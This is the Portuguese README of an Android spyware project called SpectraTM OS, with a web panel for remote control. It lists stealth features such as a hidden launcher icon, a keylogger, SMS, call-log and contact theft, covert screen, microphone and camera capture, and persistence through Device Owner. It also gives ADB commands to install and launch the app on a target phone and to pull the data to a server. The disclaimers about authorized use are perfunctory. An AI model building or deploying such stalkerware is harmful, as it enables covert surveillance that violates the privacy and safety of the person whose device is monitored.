# SpectraTM OS - Sistema de Monitoramento Avançado

Um sistema completo de monitoramento e controle remoto composto por:
- **APK Android** com funcionalidades avançadas de captura
- **Painel Web** para controle e visualização
- **Criptografia** end-to-end com Noise_KK

## 🏗️ Estrutura do Projeto

```
spectratm-os/
├── android/           # Aplicativo Android
│   ├── app/
│   │   ├── src/main/java/com/android/dpc/
│   │   ├── build.gradle.kts
│   │   └── AndroidManifest.xml
├── control/           # Servidor Web + Painel
│   ├── server.js
│   ├── public/index.html
│   └── package.json
├── noise/             # Sistema de Criptografia
│   ├── keygen.js
│   └── package.json
└── render.yaml        # Configuração de Deploy
```

## 📱 APK Android - Funcionalidades

### Recursos de Captura:
- **Tela**: Gravação contínua via MediaProjection
- **Áudio**: Captura do microfone em tempo real
- **Câmera**: Fotos automáticas em intervalos
- **Localização**: GPS contínuo em background
- **SMS**: Leitura completa de mensagens
- **Chamadas**: Log detalhado de ligações
- **Contatos**: Lista completa da agenda
- **Keylogger**: Via AccessibilityService
- **Clipboard**: Monitoramento de área de transferência

### Características Stealth:
- Sem ícone no launcher
- Foreground service silencioso
- Boot receiver para auto-inicialização
- WorkManager para manter vivo
- Device Owner para proteção

### Permissões Necessárias:
```xml
<!-- Mídia -->
<uses-permission android:name="android.permission.CAMERA"/>
<uses-permission android:name="android.permission.RECORD_AUDIO"/>
<uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION"/>

<!-- Comunicação -->
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.READ_CALL_LOG"/>
<uses-permission android:name="android.permission.READ_CONTACTS"/>

<!-- Sistema -->
<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
<uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE"/>
<uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
```

## 🖥️ Painel Web - Interface

### Funcionalidades:
- **Conexão em tempo real** via WebSocket
- **Visualização de vídeo** da tela capturada  
- **Stream de áudio** ao vivo
- **Log de dados** em tempo real
- **Comandos remotos** para o dispositivo
- **Gerenciamento de dispositivos** conectados
- **Interface responsiva** para desktop/mobile

### Endpoints da API:
- `GET /api/devices` - Lista dispositivos ativos
- `GET /api/stats` - Estatísticas do servidor
- `POST /api/command/:deviceId` - Enviar comandos
- `GET /health` - Health check

## 🔐 Sistema de Criptografia

### Noise_KK Protocol:
- **Chaves estáticas** para identidade
- **Chaves efêmeras** rotacionadas a cada 5min
- **Handshake** para estabelecer canal seguro
- **Criptografia** libsodium para máxima segurança

## 🚀 Instalação e Configuração

### 1. Preparação do Ambiente

```bash
# Clone ou crie o projeto
mkdir spectratm-os
cd spectratm-os
```

### 2. Configurar Servidor

```bash
cd control
npm install
npm start
```

O servidor estará disponível em `http://localhost:8000`

### 3. Gerar Chaves Criptográficas

```bash
cd noise
npm install
npm run keygen
```

### 4. Build do APK Android

```bash
cd android
./gradlew assembleRelease
```

### 5. Instalação no Dispositivo

```bash
# Instalar APK
adb install app/build/outputs/apk/release/app-release.apk

# Configurar como Device Owner (requer ADB)
adb shell dpm set-device-owner com.android.dpc/.DeviceAdminReceiver

# Iniciar serviço
adb shell am startservice com.android.dpc/.CoreService
```

### 6. Deploy em Produção (Render)

```bash
# Conectar repositório Git ao Render
git init
git add .
git commit -m "Initial commit"
git remote add origin https://github.com/seu-usuario/spectratm.git
git push origin main
```

O Render detectará automaticamente o `render.yaml` e fará deploy.

## 📋 Configurações Pós-Instalação

### Android:
1. **Habilitar Accessibility**: Configurações > Acessibilidade > SpectraTM
2. **Desabilitar Otimização de Bateria**: Para manter serviço ativo
3. **Permissões de Localização**: Permitir "sempre" para background
4. **MediaProjection**: Dar permissão para captura de tela

### Servidor:
1. **Configurar HTTPS** para produção
2. **Configurar domínio personalizado** 
3. **Monitorar logs** para debugging

## 🔧 Comandos Remotos Disponíveis

Via painel web é possível enviar:
- `location` - Obter localização atual
- `sms` - Buscar todas as mensagens
- `calls` - Obter log de chamadas
- `contacts` - Listar contatos
- `screenshot` - Capturar tela
- `camera` - Tirar foto
- `start_screen_capture` - Iniciar captura de tela
- `start_audio_capture` - Iniciar captura de áudio

## ⚠️ Avisos Importantes

### Segurança:
- Use **APENAS** para propósitos legítimos e autorizados
- Implemente **autenticação robusta** em produção
- **Criptografe** toda comunicação em produção
- **Monitore** acessos e uso do sistema

### Legal:
- Certifique-se de ter **autorização** para monitorar dispositivos
- Respeite **leis locais** sobre privacidade
- Implemente **políticas de retenção** de dados
- Documente **uso autorizado** do sistema

### Técnico:
- Teste extensivamente antes do uso em produção
- Configure **backups** regulares dos dados
- Monitore **performance** e **recursos**
- Mantenha **logs** de auditoria

## 📊 Monitoramento e Logs

O sistema gera logs detalhados para:
- Conexões de dispositivos
- Comandos enviados/recebidos  
- Dados capturados
- Erros e exceções
- Performance e estatísticas

## 🔄 Manutenção

### Rotação de Chaves:
As chaves efêmeras são rotacionadas automaticamente a cada 5 minutos para máxima segurança.

### Updates:
- **APK**: Redistribuir via ADB ou sistema de updates
- **Servidor**: Deploy automático via Git no Render
- **Chaves**: Regenerar periodicamente para segurança

---

**Desenvolvido para fins educacionais e de segurança autorizada.**